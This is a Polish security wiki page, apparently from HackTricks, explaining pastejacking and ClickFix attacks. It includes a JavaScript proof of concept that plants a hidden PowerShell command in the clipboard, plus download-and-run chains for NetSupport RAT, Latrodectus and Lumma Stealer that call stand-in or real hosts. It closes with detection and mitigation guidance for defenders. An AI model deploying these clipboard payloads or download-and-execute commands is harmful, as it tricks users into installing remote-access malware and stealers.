# Ataki na Przechwytywanie Schowka (Pastejacking)

{{#include ../../banners/hacktricks-training.md}}

> "Nigdy nie wklejaj niczego, czego sam nie skopiowałeś." – stare, ale wciąż aktualne porady

## Przegląd

Przechwytywanie schowka – znane również jako *pastejacking* – wykorzystuje fakt, że użytkownicy rutynowo kopiują i wklejają polecenia bez ich sprawdzania. Złośliwa strona internetowa (lub jakikolwiek kontekst obsługujący JavaScript, taki jak aplikacja Electron lub Desktop) programowo umieszcza tekst kontrolowany przez atakującego w systemowym schowku. Ofiary są zachęcane, zazwyczaj przez starannie opracowane instrukcje inżynierii społecznej, do naciśnięcia **Win + R** (okno uruchamiania), **Win + X** (Szybki dostęp / PowerShell) lub otwarcia terminala i *wklejenia* zawartości schowka, co natychmiast wykonuje dowolne polecenia.

Ponieważ **żaden plik nie jest pobierany i żaden załącznik nie jest otwierany**, technika ta omija większość zabezpieczeń e-mailowych i webowych, które monitorują załączniki, makra lub bezpośrednie wykonanie poleceń. Atak jest zatem popularny w kampaniach phishingowych dostarczających powszechne rodziny złośliwego oprogramowania, takie jak NetSupport RAT, Latrodectus loader czy Lumma Stealer.

## Dowód koncepcji w JavaScript
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Starsze kampanie używały `document.execCommand('copy')`, nowsze polegają na asynchronicznym **Clipboard API** (`navigator.clipboard.writeText`).

## Przepływ ClickFix / ClearFake

1. Użytkownik odwiedza stronę z błędami w nazwie lub skompromitowaną stronę (np. `docusign.sa[.]com`)
2. Wstrzyknięty JavaScript **ClearFake** wywołuje pomocniczą funkcję `unsecuredCopyToClipboard()`, która cicho przechowuje zakodowany w Base64 skrypt PowerShell w schowku.
3. Instrukcje HTML informują ofiarę: *„Naciśnij **Win + R**, wklej polecenie i naciśnij Enter, aby rozwiązać problem.”*
4. `powershell.exe` wykonuje, pobierając archiwum, które zawiera legalny plik wykonywalny oraz złośliwy DLL (klasyczne sideloading DLL).
5. Loader deszyfruje dodatkowe etapy, wstrzykuje shellcode i instaluje persistencję (np. zaplanowane zadanie) – ostatecznie uruchamiając NetSupport RAT / Latrodectus / Lumma Stealer.

### Przykład łańcucha NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitymny Java WebStart) przeszukuje swój katalog w poszukiwaniu `msvcp140.dll`.
* Złośliwe DLL dynamicznie rozwiązuje API za pomocą **GetProcAddress**, pobiera dwa pliki binarne (`data_3.bin`, `data_4.bin`) za pomocą **curl.exe**, deszyfruje je przy użyciu zmiennego klucza XOR `"https://google.com/"`, wstrzykuje końcowy shellcode i rozpakowuje **client32.exe** (NetSupport RAT) do `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Pobiera `la.txt` za pomocą **curl.exe**
2. Wykonuje pobieracz JScript w **cscript.exe**
3. Pobiera ładunek MSI → umieszcza `libcef.dll` obok podpisanej aplikacji → sideloading DLL → shellcode → Latrodectus.

### Lumma Stealer za pomocą MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
**mshta** wywołuje ukryty skrypt PowerShell, który pobiera `PartyContinued.exe`, wyodrębnia `Boat.pst` (CAB), rekonstruuje `AutoIt3.exe` za pomocą `extrac32` i konkatenacji plików, a na końcu uruchamia skrypt `.a3x`, który exfiltruje dane logowania przeglądarki do `sumeriavgv.digital`.

## Wykrywanie i Polowanie

Zespoły niebieskie mogą połączyć dane telemetryczne z schowka, tworzenia procesów i rejestru, aby zlokalizować nadużycia pastejacking:

* Rejestr systemu Windows: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` przechowuje historię poleceń **Win + R** – szukaj nietypowych wpisów Base64 / obfuscowanych.
* Identyfikator zdarzenia bezpieczeństwa **4688** (Tworzenie procesu), gdzie `ParentImage` == `explorer.exe` i `NewProcessName` w { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Identyfikator zdarzenia **4663** dla tworzenia plików w `%LocalAppData%\Microsoft\Windows\WinX\` lub folderach tymczasowych tuż przed podejrzanym zdarzeniem 4688.
* Czujniki schowka EDR (jeśli są obecne) – skoreluj `Clipboard Write` natychmiast po nowym procesie PowerShell.

## Łagodzenia

1. Wzmocnienie przeglądarki – wyłącz dostęp do zapisu w schowku (`dom.events.asyncClipboard.clipboardItem` itp.) lub wymagaj gestu użytkownika.
2. Świadomość bezpieczeństwa – ucz użytkowników, aby *wpisywali* wrażliwe polecenia lub wklejali je najpierw do edytora tekstu.
3. Tryb ograniczonego języka PowerShell / Polityka wykonania + Kontrola aplikacji, aby zablokować dowolne jednowierszowe polecenia.
4. Kontrole sieciowe – zablokuj wychodzące żądania do znanych domen pastejacking i C2 złośliwego oprogramowania.

## Powiązane Sztuczki

* **Discord Invite Hijacking** często nadużywa tego samego podejścia ClickFix po zwabieniu użytkowników na złośliwy serwer:
{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Odniesienia

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)

{{#include ../../banners/hacktricks-training.md}}
